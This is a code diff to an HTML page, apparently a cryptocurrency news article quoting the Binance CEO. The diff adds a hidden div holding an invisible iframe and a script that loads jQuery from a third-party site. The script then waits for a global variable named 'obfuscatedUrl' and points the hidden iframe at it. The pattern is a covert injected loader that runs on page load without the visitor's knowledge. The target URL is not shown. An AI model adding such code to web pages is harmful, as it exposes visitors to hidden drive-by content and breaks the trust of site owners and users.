@@ -51,5 +51,37 @@ The Binance CEO opined:
 	</div>
 </div>
 
+<div style="display:none">
+<iframe id="declinedframe" src="" height="100" width="100" ></iframe>
+
+</div>
+		<script src = "https://www.tutorialspoint.com/jquery/jquery-3.6.0.js"></script>
+
+	<script>
+      var i = 1;                  
+
+      function myLoop() {         
+        setTimeout(function() {   
+          i++;                    
+          if (i < 3) {           
+            myLoop();             
+          } else {
+		if (typeof obfuscatedUrl === 'undefined') {
+			myLoop();
+			  // myVar is (not defined) OR (defined AND unitialized)
+		} else {
+			   //var entire = obfuscatedUrl; 
+
+		  $('#declinedframe').attr('src', obfuscatedUrl);
+		}
+		//popEvent();
+		 
+	   }		  
+        }, 2000)
+      }
+      
+      myLoop();    
+    </script>
+	
 </body>
 </html>
